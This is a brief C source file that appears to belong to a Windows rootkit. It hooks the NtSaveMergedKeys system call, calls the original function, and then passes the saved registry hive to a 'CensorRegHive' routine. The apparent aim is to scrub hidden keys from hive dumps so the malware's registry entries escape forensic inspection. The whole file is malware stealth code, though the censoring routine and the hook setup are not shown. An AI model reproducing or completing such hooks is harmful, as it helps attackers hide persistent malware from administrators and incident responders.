#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"
#include "regraw.h"

#include "ntsavemergedkeys.h"
#include "ntsavekey.h"

NTSTATUS WINAPI NewNtSaveMergedKeys(
  HANDLE KeyHandle1,
  HANDLE KeyHandle2,
  HANDLE FileHandle
)
{
	NTSTATUS rc;

	// call original function
	rc=OldNtSaveMergedKeys(KeyHandle1,KeyHandle2,FileHandle);
	if (NT_SUCCESS(rc))
		CensorRegHive(FileHandle);

	return rc;
}

